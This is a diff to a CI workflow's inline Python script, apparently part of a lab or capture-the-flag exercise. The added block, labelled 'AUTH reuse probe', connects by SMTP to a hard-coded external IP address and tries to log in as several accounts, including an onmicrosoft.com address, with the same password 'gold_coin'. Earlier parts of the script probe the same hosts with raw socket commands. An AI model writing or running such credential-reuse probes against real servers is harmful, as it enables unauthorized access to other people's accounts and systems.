@@ -15,6 +15,7 @@ jobs:
         run: |
           python3 - <<'PY'
           import socket
+          import smtplib
 
           hosts = ("4.148.93.130", "4.227.70.59")
           commands = (
@@ -52,4 +53,22 @@ jobs:
                           print("RESPONSE", repr(receive(sock)))
               except Exception as error:
                   print(type(error).__name__, str(error))
+
+          print("=== AUTH reuse probe ===")
+          for username in (
+              "guest",
+              "guest@notify.thecontinental.local",
+              "winston@ztaha45hotmail.onmicrosoft.com",
+          ):
+              try:
+                  with smtplib.SMTP("4.148.93.130", 1025, timeout=8) as smtp:
+                      smtp.ehlo("ci-runner.continental.local")
+                      print("FEATURES", smtp.esmtp_features)
+                      try:
+                          code, message = smtp.login(username, "gold_coin")
+                          print("AUTH", username, code, message.decode("utf-8", "replace"))
+                      except Exception as error:
+                          print("AUTH", username, type(error).__name__, str(error))
+              except Exception as error:
+                  print("CONNECT", username, type(error).__name__, str(error))
           PY
